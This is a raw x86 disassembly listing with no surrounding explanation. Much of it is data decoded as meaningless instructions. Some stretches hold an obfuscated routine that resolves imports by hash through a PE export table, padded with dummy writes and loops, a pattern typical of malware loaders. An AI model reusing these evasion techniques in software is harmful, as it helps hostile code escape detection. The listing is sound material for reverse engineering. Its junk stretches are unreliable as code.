  4119ad:	mov    ds:0x4cc43f4a,al
  4119b2:	or     bl,dh
  4119b4:	dec    esi
  4119b5:	stos   BYTE PTR es:[edi],al
  4119b6:	(bad)  
  4119b7:	or     DWORD PTR [edi-0x77],esi
  4119ba:	pop    es
  4119bb:	dec    esp
  4119bc:	stc    
  4119bd:	in     al,0xdb
  4119bf:	mov    es,WORD PTR [edx+0x3c]
  4119c2:	(bad)  
  4119c4:	mov    cl,0xa9
  4119c6:	cmp    esi,DWORD PTR [edi]
  4119c8:	push   ebp
  4119c9:	and    esi,DWORD PTR [esi]
  4119cb:	iret   
  4119cc:	sub    eax,0xd536ebd6
  4119d1:	call   0x87a80c45
  4119d6:	add    eax,0xd0fea0fb
  4119db:	repz xor BYTE PTR [ebx],bl
  4119de:	rep gs ins BYTE PTR es:[edi],dx
  4119e1:	in     al,dx
  4119e2:	xor    al,0xf6
  4119e4:	adc    DWORD PTR [edi+0x2d310a2e],ebp
  4119ea:	push   cs
  4119eb:	neg    DWORD PTR [eax]
  4119ed:	(bad)  
  4119ee:	xor    BYTE PTR [esi+0x5a06801d],bl
  4119f4:	cmp    al,0xb8
  4119f6:	add    eax,0x72049c8d
  4119fb:	ds (bad) 
  4119fe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a00:	pop    ecx
  411a01:	and    dl,BYTE PTR ds:0xcbe3b527
  411a07:	gs stos BYTE PTR es:[edi],al
  411a09:	int    0x5e
  411a0b:	add    al,0x7a
  411a0d:	loope  0x411a01
  411a0f:	mov    esp,0x3214e066
  411a14:	pop    ebx
  411a15:	shl    DWORD PTR [edi],1
  411a17:	jmp    0x411a25
  411a19:	les    eax,FWORD PTR [eax]
  411a1b:	test   eax,0x5b034837
  411a20:	or     ebx,DWORD PTR [edx]
  411a22:	shld   DWORD PTR [edx+0x52bc4e2b],ecx,0x83
  411a2a:	add    bh,BYTE PTR [edi-0x2d458fcd]
  411a30:	inc    esi
  411a31:	pop    esp
  411a32:	xchg   DWORD PTR [edi+eiz*2-0x310929f1],edi
  411a39:	loope  0x411a22
  411a3b:	repnz mov ch,0x36
  411a3e:	loopne 0x4119c7
  411a40:	into   
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x4345f7
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x434577,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x43464f
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x43464f,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x4345b7,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x43457f,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x43456b,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x4345d3,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x434643,0x4345fb
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434693,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x434573,0x434567
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43468f,0x43464b
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x4345cf
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x434637,0x0
  411b01:	mov    esi,DWORD PTR ds:0x434637
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x434637,esi
  411b0e:	cmp    DWORD PTR ds:0x434637,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x434637,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x434637,0x4345f7
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x4345b7,0x434567
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x434637
  411b6a:	and    ecx,DWORD PTR ds:0x43460b
  411b70:	mov    DWORD PTR ds:0x434637,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43468f,0x13
  411b83:	cmp    DWORD PTR ds:0x43468f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43468f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434790
  411ba2:	push   0x434735
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43468f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43468f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x43456b,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x43464b,0x10
  411bd3:	cmp    DWORD PTR ds:0x43464b,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x43464b,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x434855
  411bfa:	push   0x434869
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x43464b
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x43464b,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	inc    esi
  411c72:	mov    ebp,0x56d5991b
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411ce4
  411c7e:	and    eax,0x48afcf8b
  411c83:	loop   0x411c36
  411c85:	popf   
  411c86:	sbb    al,BYTE PTR [esi+edx*1+0x17]
  411c8a:	mov    bl,BYTE PTR [esi]
  411c8c:	pop    esi
  411c8d:	and    al,0x3d
  411c8f:	push   ss
  411c90:	(bad)  
  411c91:	(bad)  
  411c92:	pop    eax
  411c93:	in     al,dx
  411c94:	call   0x140a:0x381de18e
  411c9b:	xor    DWORD PTR [ebx-0x63],esi
  411c9e:	sbb    BYTE PTR [edx+0x1f],bh
  411ca1:	inc    esi
  411ca2:	mov    al,0xf5
  411ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca5:	hlt    
  411ca6:	loop   0x411ca3
  411ca8:	scas   eax,DWORD PTR es:[edi]
  411ca9:	pop    ebp
  411caa:	sbb    edi,DWORD PTR [esi-0x4c]
  411cad:	dec    edx
  411cae:	push   ecx
  411caf:	pop    eax
  411cb0:	pop    ebx
  411cb1:	loop   0x411d09
  411cb3:	mov    esp,0xcc1eac4f
  411cb8:	jae    0x411c64
  411cba:	mov    esi,0xc5d1c33d
  411cbf:	test   al,0xab
  411cc1:	jbe    0x411c49
  411cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc4:	hlt    
  411cc5:	test   dh,0x4d
  411cc8:	aas    
  411cc9:	pop    esi
  411cca:	leave  
  411ccb:	cmp    DWORD PTR [edx-0x547ff6eb],edx
  411cd1:	add    DWORD PTR [eax+0x1f4bdff3],0x5455b45d
  411cdb:	data16 mov ah,0xf1
  411cde:	stos   BYTE PTR es:[edi],al
  411cdf:	pop    ebp
  411ce0:	aas    
  411ce1:	in     eax,dx
  411ce2:	mov    ah,0x74
  411ce4:	mov    BYTE PTR [esi+0x3e5a2290],ah
  411cea:	mov    ds:0x9fe0fe50,eax
  411cef:	fs mov dh,ah
  411cf2:	cmp    al,0x95
  411cf4:	fwait
  411cf5:	ss das 
  411cf7:	sub    DWORD PTR [edx],ebp
  411cf9:	setb   BYTE PTR [ebp+0x1a]
  411cfd:	leave  
  411cfe:	out    dx,eax
  411cff:	ret    0xd2ca
  411d02:	pop    edi
  411d03:	jmp    0x411d0b
  411d05:	les    esp,FWORD PTR [eax+0x43]
  411d08:	inc    ebx
  411d09:	xchg   ebx,eax
  411d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d0b:	stos   DWORD PTR es:[edi],eax
  411d0c:	or     BYTE PTR [ecx-0x592941ac],bl
  411d12:	(bad)  
  411d13:	ss cmp al,0xfc
  411d16:	rcl    bl,cl
  411d18:	mov    edx,0xb144a21d
  411d1d:	gs xor dl,bl
  411d20:	jmp    0xa306:0x954a1432
  411d27:	(bad)  
  411d28:	in     al,dx
  411d29:	loope  0x411cd6
  411d2b:	in     eax,dx
  411d2c:	ins    BYTE PTR es:[edi],dx
  411d2d:	outs   dx,BYTE PTR ds:[esi]
  411d2e:	stos   DWORD PTR es:[edi],eax
  411d2f:	cld    
  411d30:	sub    al,0x5a
  411d32:	js     0x411d7f
  411d34:	cmp    al,0xfe
  411d36:	aas    
  411d37:	sbb    eax,0x32f0ae03
  411d3c:	mov    WORD PTR [esi+0x6b],?
  411d3f:	lds    esi,FWORD PTR es:[esi-0x50]
  411d43:	sub    DWORD PTR [eax-0x67be74e8],edi
  411d49:	pop    es
  411d4a:	in     eax,0x9f
  411d4c:	mov    edi,0x71da4636
  411d51:	dec    ecx
  411d52:	mov    eax,ds:0xdb212a85
  411d57:	push   esi
  411d58:	add    eax,0x235648bc
  411d5d:	shr    DWORD PTR [ecx-0x65],1
  411d60:	aam    0x13
  411d62:	fucomi st,st(1)
  411d64:	leave  
  411d65:	jbe    0x411d99
  411d67:	dec    eax
  411d68:	dec    ebp
  411d69:	add    al,0x6
  411d6b:	enter  0x77ab,0xca
  411d6f:	dec    ebp
  411d70:	sub    dl,BYTE PTR [edi+eax*1+0x10]
  411d74:	mov    ss,WORD PTR [ebx+0x721c75f2]
  411d7a:	xchg   DWORD PTR [ebp-0x1a],edx
  411d7d:	mov    esi,?
  411d7f:	nop
  411d80:	mov    ds:0x405b504a,al
  411d85:	hlt    
  411d86:	(bad)  
  411d87:	adc    dh,al
  411d89:	pop    es
  411d8a:	add    DWORD PTR [ebx+0x71],0xfffffff6
  411d8e:	mov    ecx,0xf72dfe72
  411d93:	loope  0x411dbb
  411d95:	int    0xe5
  411d97:	sub    ecx,DWORD PTR [ecx]
  411d99:	mov    bl,0x62
  411d9b:	dec    eax
  411d9c:	and    ecx,DWORD PTR [eax-0x3300a387]
  411da2:	xrelease mov DWORD PTR cs:[ebp-0x51],edx
  411da7:	mov    eax,0x72bedf1b
  411dac:	mov    ebp,0x4327beb0
  411db1:	pushf  
  411db2:	sti    
  411db3:	push   cs
  411db4:	call   0x29eb7d84
  411db9:	sahf   
  411dba:	cld    
  411dbb:	cmp    eax,0x93ff3b7a
  411dc0:	scas   eax,DWORD PTR es:[edi]
  411dc1:	sbb    DWORD PTR [edi-0x1ce95623],ebx
  411dc7:	adc    DWORD PTR ds:0x5e206f11,esi
  411dcd:	mov    ah,BYTE PTR [ecx]
  411dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd0:	or     eax,0x41be31fe
  411dd5:	adc    ebp,ebx
  411dd7:	ret    0xa99c
  411dda:	leave  
  411ddb:	aam    0xd0
  411ddd:	lock mov edx,0x2ee9d59a
  411de3:	rcl    DWORD PTR [eax+0x7f],cl
  411de6:	(bad)  
  411de7:	sub    DWORD PTR [edx+0x2f],0x2484492f
  411dee:	cmp    bh,bl
  411df0:	adc    BYTE PTR [ecx-0x57],ah
  411df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df4:	mov    esp,0x888c041a
  411df9:	test   DWORD PTR [ecx-0x47],edx
  411dfc:	xchg   ebx,eax
  411dfd:	retf   0x1897
  411e00:	jns    0x411dc4
  411e02:	ret    0x5a72
  411e05:	fdivr  QWORD PTR [esi+0x10]
  411e08:	adc    al,dh
  411e0a:	jl     0x411e66
  411e0c:	stos   BYTE PTR es:[edi],al
  411e0d:	arpl   WORD PTR [edi+0x5a9efbf5],cx
  411e13:	push   ebp
  411e14:	sar    BYTE PTR [edi],cl
  411e16:	pusha  
  411e17:	sahf   
  411e18:	push   ds
  411e19:	push   ds
  411e1a:	jb     0x411e88
  411e1c:	pop    edx
  411e1d:	xchg   edi,eax
  411e1e:	shl    BYTE PTR [esi+0x3934d340],1
  411e24:	sbb    al,0xb0
  411e26:	xor    eax,0x4bfdaee7
  411e2b:	cmp    eax,0x35a5dfca
  411e30:	or     ebp,DWORD PTR [ebx]
  411e32:	jmp    0x52133bc7
  411e37:	cmp    al,0x7d
  411e39:	mov    eax,ds:0x3f1a76d9
  411e3e:	cli    
  411e3f:	mov    eax,ds:0x62c40dc3
  411e44:	js     0x411e8d
  411e46:	xor    BYTE PTR [edi],ah
  411e48:	loope  0x411dec
  411e4a:	scas   al,BYTE PTR es:[edi]
  411e4b:	xchg   esi,eax
  411e4c:	cs mov ecx,0x428ef1f3
  411e52:	in     eax,0x4c
  411e54:	out    dx,eax
  411e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e56:	cmovp  ecx,DWORD PTR [ecx]
  411e59:	adc    BYTE PTR [esp+edi*2-0x521d434c],ah
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	xchg   BYTE PTR [ecx+eax*1+0x7e5030f5],bh
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411f48
  411ecc:	dec    eax
  411ecd:	outs   dx,DWORD PTR ds:[esi]
  411ece:	pushf  
  411ecf:	fidivr WORD PTR [edi+0x11]
  411ed2:	add    al,0x78
  411ed4:	mov    esi,0x63c1dd7b
  411ed9:	icebp  
  411eda:	test   DWORD PTR [edx+0x5d],ecx
  411edd:	bound  ebp,QWORD PTR [esi-0x4b]
  411ee0:	das    
  411ee1:	jmp    0xe353af89
  411ee6:	mov    ds:0x85f4f9f3,al
  411eeb:	xchg   ebx,eax
  411eec:	or     BYTE PTR [edi+0x69],dh
  411eef:	xchg   dh,bh
  411ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef2:	or     eax,DWORD PTR [eax-0x748e9142]
  411ef8:	aaa    
  411ef9:	lock sar BYTE PTR [edi+0x72],cl
  411efd:	lods   al,BYTE PTR ds:[esi]
  411efe:	gs inc edx
  411f00:	sub    BYTE PTR [ebp+0x693f5174],bl
  411f06:	(bad)  
  411f07:	aad    0x3
  411f09:	or     ebp,edx
  411f0b:	popa   
  411f0c:	rcr    DWORD PTR [edi],0xc4
  411f0f:	(bad)  
  411f10:	test   eax,0x7d955435
  411f15:	fld1   
  411f17:	imul   eax,DWORD PTR [ebx],0xdf03761d
  411f1d:	mov    eax,ds:0xf6bc51d2
  411f22:	pop    ecx
  411f23:	test   DWORD PTR [ebx-0x44],edi
  411f26:	jb     0x411fa4
  411f28:	daa    
  411f29:	mov    dh,0xb8
  411f2b:	mov    WORD PTR [edx],es
  411f2d:	inc    ebx
  411f2e:	arpl   WORD PTR [esi-0x59faeb6c],si
  411f34:	inc    edi
  411f35:	std    
  411f36:	inc    ecx
  411f37:	and    eax,0x7d4416c0
  411f3c:	push   edx
  411f3d:	push   0xffffffe8
  411f3f:	mov    ebp,0xf765ea9f
  411f44:	jae    0x411f5f
  411f46:	loop   0x411f3d
  411f48:	sub    ah,al
  411f4a:	imul   ebx,DWORD PTR [esi+0x6e10958b],0x7f
  411f51:	lea    edi,[eax+0x5d0d742]
  411f57:	push   ds
  411f58:	fwait
  411f59:	ins    DWORD PTR es:[edi],dx
  411f5a:	call   0x3a27d1c8
  411f5f:	xlat   BYTE PTR ds:[ebx]
  411f60:	xchg   ebx,eax
  411f61:	lahf   
  411f62:	xlat   BYTE PTR ds:[ebx]
  411f63:	jne    0x411f6c
  411f65:	or     esp,ebp
  411f67:	sub    al,0x54
  411f69:	mov    ecx,0x7e1ae6ed
  411f6e:	mov    ecx,0x9d745ab4
  411f73:	stc    
  411f74:	mov    WORD PTR [esp+edx*1+0x66],?
  411f78:	sub    ecx,DWORD PTR [eax]
  411f7a:	xchg   BYTE PTR ds:0xafae0474,bh
  411f80:	inc    edi
  411f81:	dec    edx
  411f82:	stos   DWORD PTR es:[edi],eax
  411f83:	mov    dh,0x6c
  411f85:	dec    eax
  411f86:	mov    ecx,0xf876039
  411f8b:	xor    al,0x6d
  411f8d:	aaa    
  411f8e:	packssdw mm6,QWORD PTR [eax+0x3f]
  411f92:	aaa    
  411f93:	mov    edi,0xee60217c
  411f98:	outs   dx,BYTE PTR ds:[esi]
  411f99:	ins    BYTE PTR es:[edi],dx
  411f9a:	fadd   DWORD PTR [ebx-0x2cc70a54]
  411fa0:	mov    dl,BYTE PTR [edx+edi*4]
  411fa3:	xor    al,0xc1
  411fa5:	rcr    cl,1
  411fa7:	cmc    
  411fa8:	inc    ebp
  411fa9:	retf   
  411faa:	bnd jnp 0x411f49
  411fad:	imul   ecx,DWORD PTR [eax+0xd40c711],0xb78f807a
  411fb7:	sbb    eax,esp
  411fb9:	mov    eax,0x860ea444
  411fbe:	pop    esi
  411fbf:	inc    ecx
  411fc0:	adc    dh,bh
  411fc2:	jl     0x412036
  411fc4:	mov    esi,0x7ba4591c
  411fc9:	mov    bl,0x5b
  411fcb:	mov    eax,0x9fdb354b
  411fd0:	ror    BYTE PTR [edx+0x161a262d],0xef
  411fd7:	fwait
  411fd8:	push   esi
  411fd9:	push   ebx
  411fda:	jno    0x41200d
  411fdc:	pop    ebp
  411fdd:	(bad)  
  411fdf:	popa   
  411fe0:	sub    al,0xf8
  411fe2:	std    
  411fe3:	les    eax,FWORD PTR [ecx-0x2d]
  411fe6:	mov    ebp,0x2f1be9e3
  411feb:	call   0xa3b7:0xd7411150
  411ff2:	(bad)  
  411ff3:	in     al,dx
  411ff4:	scas   eax,DWORD PTR es:[edi]
  411ff5:	arpl   WORD PTR [esi-0x3e],ax
  411ff8:	pop    ebx
  411ff9:	popa   
  411ffa:	stos   DWORD PTR es:[edi],eax
  411ffb:	int    0x96
  411ffd:	fld    TBYTE PTR [esi]
  411fff:	inc    ebp
  412000:	adc    BYTE PTR [eax+0x28],bh
  412003:	or     DWORD PTR [edi],ebp
  412005:	jnp    0x411fdb
  412007:	(bad)  
  412008:	cmc    
  412009:	in     al,0x32
  41200b:	cdq    
  41200c:	jno    0x412006
  41200e:	lahf   
  41200f:	popf   
  412010:	push   ebp
  412011:	jecxz  0x412012
  412013:	xor    dh,dl
  412015:	shr    BYTE PTR [ebx+0x19],1
  412018:	dec    esp
  412019:	push   ecx
  41201a:	adc    dl,al
  41201c:	jb     0x411ffb
  41201e:	in     eax,dx
  41201f:	cmp    eax,0x3c671cc
  412024:	pop    edx
  412025:	inc    esp
  412026:	dec    ebp
  412027:	daa    
  412028:	lds    ecx,FWORD PTR [ebx-0x7ad5067]
  41202e:	dec    esi
  41202f:	push   edi
  412030:	pop    ss
  412031:	cdq    
  412032:	lds    ebp,FWORD PTR [ecx+0x57d65e19]
  412038:	xchg   edx,eax
  412039:	cmp    BYTE PTR [edi-0x7bf2b588],bl
  41203f:	sub    ecx,DWORD PTR [ebx-0x3e]
  412042:	fadd   QWORD PTR [edi+edx*1-0x180bb1a3]
  412049:	jl     0x411fd9
  41204b:	push   DWORD PTR [ebp-0x77]
  41204e:	(bad)  [edi]
  412050:	mov    ebx,DWORD PTR gs:[ecx]
  412053:	aad    0x5c
  412055:	dec    eax
  412056:	aaa    
  412057:	mov    ds:0xbb596750,eax
  41205c:	jge    0x41208c
  41205e:	(bad)  
  41205f:	fstp   DWORD PTR [edi+0x9]
  412062:	push   ss
  412063:	imul   esi,DWORD PTR [edx],0xffffff97
  412066:	push   esp
  412067:	xchg   esi,eax
  412068:	jns    0x412071
  41206a:	fcmovb st,st(3)
  41206c:	sbb    ecx,ebp
  41206e:	mov    al,ds:0x834b78d1
  412073:	iret   
  412074:	sahf   
  412075:	enter  0x1b1b,0x8b
  412079:	out    0x4a,al
  41207b:	or     BYTE PTR [ebx],dh
  41207d:	xor    al,0x2b
  41207f:	test   BYTE PTR [ecx+0x7f],al
  412082:	pop    esp
  412083:	inc    ebp
  412084:	mov    ebp,0x70dcbba7
  412089:	pop    ebp
  41208a:	mov    edx,0xa9800eb2
  41208f:	out    0xd6,eax
  412091:	mov    esi,DWORD PTR [esi+0x64]
  412094:	cmp    eax,0xcba1448
  412099:	jl     0x4120c8
  41209b:	int    0xe6
  41209d:	repnz shr BYTE PTR gs:[ecx],1
  4120a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a2:	add    eax,0x828cec1a
  4120a7:	std    
  4120a8:	dec    ecx
  4120a9:	add    dh,dh
  4120ab:	int3   
  4120ac:	jmp    0x48b:0xec4d8b90
  4120b3:	sub    ecx,0x1fb
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	mov    edi,0x1390af4c
  4120ca:	push   edx
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x412139
  4120d2:	xchg   ecx,eax
  4120d3:	rcl    BYTE PTR [eax+eax*8],0x1a
  4120d7:	add    BYTE PTR [esi+0x22],cl
  4120da:	xlat   BYTE PTR ds:[ebx]
  4120db:	jo     0x4120dc
  4120dd:	xchg   BYTE PTR [edx+0x2eac468c],dl
  4120e3:	dec    edi
  4120e4:	mov    edi,0x49d17955
  4120e9:	xor    esp,DWORD PTR [edx-0x2ee05259]
  4120ef:	xchg   BYTE PTR ds:0x6f92af44,ch
  4120f5:	call   0xf44b:0x30f6eaf0
  4120fc:	push   ebx
  4120fd:	mov    ecx,0xeed9c9bd
  412102:	inc    ebp
  412103:	sbb    eax,0x33a93c9c
  412108:	mov    eax,ds:0xbb0548a0
  41210d:	imul   DWORD PTR [edi-0x69]
  412110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412111:	and    DWORD PTR [eax-0x53b5ebf5],edx
  412117:	leave  
  412118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412119:	rcr    DWORD PTR [edi],0x69
  41211c:	je     0x4120fa
  41211e:	and    bh,BYTE PTR [eax-0xfc0148b]
  412124:	scas   eax,DWORD PTR es:[edi]
  412125:	or     al,0x47
  412127:	jmp    0xb8e2e951
  41212c:	pop    es
  41212d:	out    0xc2,eax
  41212f:	mov    dh,0x2c
  412131:	in     al,0x8a
  412133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412134:	jmp    0x95920ac3
  412139:	pop    esi
  41213a:	inc    esi
  41213b:	or     DWORD PTR [edi-0x4e88e8e8],esp
  412141:	loop   0x412108
  412143:	aam    0xcf
  412145:	stos   DWORD PTR es:[edi],eax
  412146:	daa    
  412147:	jmp    0xe3521ecf
  41214c:	bound  ebx,QWORD PTR [ecx+0x11fe806a]
  412152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412153:	ret    
  412154:	pop    ds
  412155:	xor    DWORD PTR [eax],0xffffffd4
  412158:	(bad)
  41215c:	ss addr16 je 0x4121bb
  412160:	sub    BYTE PTR [ebx],0x19
  412163:	rcr    BYTE PTR [esi-0x23b21f3],0x1
  41216a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41216b:	lea    ebp,[edi-0x7f]
  41216e:	dec    eax
  41216f:	mov    bh,0x7a
  412171:	lods   al,BYTE PTR ds:[esi]
  412172:	mov    al,0x1e
  412174:	sub    esi,ebp
  412176:	rcr    BYTE PTR [esi+0xa032dc2],1
  41217c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217d:	add    al,0xd7
  41217f:	mov    bl,0xcb
  412181:	sub    eax,0x21215454
  412186:	cli    
  412187:	mov    esi,0x32e1bdde
  41218c:	xor    BYTE PTR [esi+0x37e4b88],bh
  412192:	fisttp DWORD PTR [ecx-0x56]
  412195:	lods   al,BYTE PTR ds:[esi]
  412196:	adc    eax,0x2c88110f
  41219b:	fistp  QWORD PTR es:[ebx]
  41219e:	(bad)  
  41219f:	dec    eax
  4121a0:	jnp    0x412189
  4121a2:	mov    bh,0x8
  4121a4:	inc    ecx
  4121a5:	outs   dx,BYTE PTR ds:[esi]
  4121a6:	fdivp  st(3),st
  4121a8:	and    dh,BYTE PTR [edi]
  4121aa:	ror    bl,0x65
  4121ad:	scas   al,BYTE PTR es:[edi]
  4121ae:	fidiv  WORD PTR [eax-0x71]
  4121b1:	and    al,0xb2
  4121b3:	(bad)  
  4121b4:	mov    bh,0x68
  4121b6:	mov    ds:0xe3bea0be,eax
  4121bb:	pop    esp
  4121bc:	adc    BYTE PTR [esi],al
  4121be:	and    BYTE PTR [eax+edx*2],bl
  4121c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c2:	cmp    edx,DWORD PTR [esi+0x107ef897]
  4121c8:	iret   
  4121c9:	imul   edi,DWORD PTR [edi+0x36447740],0x9340f145
  4121d3:	adc    al,0xb7
  4121d5:	clc    
  4121d6:	retf   
  4121d7:	inc    edx
  4121d8:	repnz push ss
  4121da:	add    DWORD PTR [ebp+0x19],eax
  4121dd:	lods   eax,DWORD PTR ds:[esi]
  4121de:	and    eax,0xcb79e38c
  4121e3:	cmc    
  4121e4:	lock push 0x6b
  4121e7:	ret    
  4121e8:	push   ecx
  4121e9:	add    esi,eax
  4121eb:	jb     0x412203
  4121ed:	or     eax,0x43e7103b
  4121f2:	adc    al,0x7f
  4121f4:	jbe    0x412264
  4121f6:	adc    ebx,ecx
  4121f8:	ins    DWORD PTR es:[edi],dx
  4121f9:	imul   edi,DWORD PTR [edi+0x5cc4c648],0x6e8f068
  412203:	xlat   BYTE PTR ds:[ebx]
  412204:	push   ds
  412205:	lods   eax,DWORD PTR ds:[esi]
  412206:	mov    esi,0x173cdc
  41220b:	mov    bh,0x56
  41220d:	xor    ch,al
  41220f:	mov    esi,0x6789cedf
  412214:	sub    eax,0x9bd256d6
  412219:	data16 std 
  41221b:	adc    eax,0x3e95c8f8
  412220:	jo     0x41222e
  412222:	sbb    DWORD PTR [eax],0x1f
  412225:	pop    ds
  412226:	aad    0x63
  412228:	inc    esp
  412229:	sub    bh,ch
  41222b:	jge    0x4121d1
  41222d:	mov    BYTE PTR [ebx],cl
  41222f:	fwait
